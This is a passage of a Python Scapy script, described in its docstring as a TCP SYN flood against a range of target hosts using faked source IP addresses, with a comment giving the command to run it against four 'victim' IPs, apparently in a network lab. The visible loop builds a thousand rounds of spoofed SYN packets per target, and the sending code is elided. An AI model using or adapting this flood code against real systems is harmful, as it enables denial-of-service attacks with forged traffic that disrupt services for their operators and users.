#run on host's xterm terminal "python -E multi-syn.py victim1_ip victim2_ip victim3_ip victim4_ip"
"""
TCP-SYN flooding attack use a rage of target host IP addresses with faked source IP addresses
...
def main():
    ...
    for i in range(1000):
        # form the packet
        packets = Ether()/IP(dst=dstIP1, src=sourceIPgen())/TCP(dport=int(RandShort()), sport=int(RandShort()), flags="S")
        print(repr(packets))
        packets = Ether()/IP(dst=dstIP2, src=sourceIPgen())/TCP(dport=int(RandShort()), sport=int(RandShort()), flags="S")
        print(repr(packets))
        packets = Ether()/IP(dst=dstIP3, src=sourceIPgen())/TCP(dport=int(RandShort()), sport=int(RandShort()), flags="S")
        print(repr(packets))
        packets = Ether()/IP(dst=dstIP4, src=sourceIPgen())/TCP(dport=int(RandShort()), sport=int(RandShort()), flags="S")
        print(repr(packets))
